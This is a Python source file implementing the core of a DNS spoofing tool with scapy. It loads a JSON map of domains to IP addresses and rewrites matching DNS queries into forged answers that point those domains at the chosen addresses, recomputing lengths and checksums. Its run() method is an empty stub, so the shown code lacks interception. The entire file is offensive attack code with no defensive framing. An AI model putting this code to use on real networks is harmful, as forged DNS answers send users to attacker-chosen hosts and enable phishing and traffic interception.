import json
import scapy.all as scapy


class DNSspoofer:
    def __init__(self, file_path: str) -> None:
        self.target = ""
        with open(file_path, "r", encoding="utf-8") as f:
            self.dns = json.load(f)

    def modify_packet(self, pkt):
        if pkt.haslayer(scapy.DNSQR):
            qname = pkt[scapy.DNSQR].qname.decode("utf-8").rstrip(".")

            if qname not in self.dns:
                print("No modifications needed for:", qname)
                return pkt

            print(f"[+] Spoofing DNS for {qname} -> {self.dns[qname]}")

            spoofed_answer = scapy.DNSRR(
                rrname=pkt[scapy.DNSQR].qname, rdata=self.dns[qname]
            )

            pkt[scapy.DNS].an = spoofed_answer
            pkt[scapy.DNS].ancount = 1
            pkt[scapy.DNS].qr = 1

            if pkt.haslayer(scapy.IP):
                del pkt[scapy.IP].len
                del pkt[scapy.IP].chksum
            if pkt.haslayer(scapy.UDP):
                del pkt[scapy.UDP].len
                del pkt[scapy.UDP].chksum

        return pkt

    def run(self):
        pass
